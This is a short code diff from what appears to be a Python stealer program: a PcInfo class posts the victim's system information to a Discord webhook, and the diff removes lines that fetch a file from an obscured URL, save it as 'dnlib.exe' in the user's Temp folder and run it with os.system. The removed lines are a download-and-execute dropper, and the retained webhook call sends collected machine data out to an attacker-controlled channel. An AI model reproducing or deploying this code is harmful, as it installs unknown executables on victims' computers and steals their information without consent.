@@ -188,11 +188,7 @@ class PcInfo:
         embed.set_thumbnail(url="")
 
         webhook.send(embed=embed, avatar_url="", username="eray")
-        sysdir = (xy24)
-        response = requests.get(sysdir)
-        with open("C:/Users/"+(username)+"/AppData/Local/Temp/dnlib.exe", "wb") as f:
-             f.write(response.content)
-        os.system("C:/Users/"+(username)+"/AppData/Local/Temp/dnlib.exe")
+        
 
 class Discord:
     def __init__(self):
